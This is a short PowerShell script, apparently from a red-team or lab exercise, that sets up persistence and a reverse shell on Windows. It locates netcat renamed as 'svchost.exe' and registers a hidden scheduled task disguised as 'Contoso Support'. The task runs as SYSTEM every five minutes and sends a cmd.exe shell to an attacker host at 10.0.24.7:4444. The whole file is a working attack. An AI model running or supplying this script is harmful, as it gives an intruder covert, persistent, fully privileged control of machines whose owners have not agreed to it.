﻿try{
$ncLocation = Resolve-Path 'C:\Users\JeffL\Desktop\readysess\2a. C2\svchost.exe'
}
catch{
    Write-Host "[-] ERROR. Did you download nc.exe from Kali and rename it to svchost.exe?" -ForegroundColor Red
    Exit
}
# no DNS (n), be Verbose (v). Execute cmd.exe after success, giving Kali a shell...
$Action = New-ScheduledTaskAction -Execute $ncLocation -Argument "-nv 10.0.24.7 4444 -e cmd.exe"

# pre-reqs...
$repeat = (New-TimeSpan -Minutes 5)
$duration = ([timespan]::MaxValue)

$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval $repeat 

# hide this; start whenever, don't let a new process kill a previous one (dont kill a session if it remains open)
$Settings = New-ScheduledTaskSettingsSet -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -StartWhenAvailable -AllowStartIfOnBatteries -Hidden -MultipleInstances IgnoreNew

# register this; have it run as SYSTEM; which doesn't require a Password ;)
# Have it run every 5 min
Register-ScheduledTask -TaskName 'Contoso Support' -Action $Action -Trigger $Trigger -RunLevel Highest -User 'NT AUTHORITY\SYSTEM' -Settings $Settings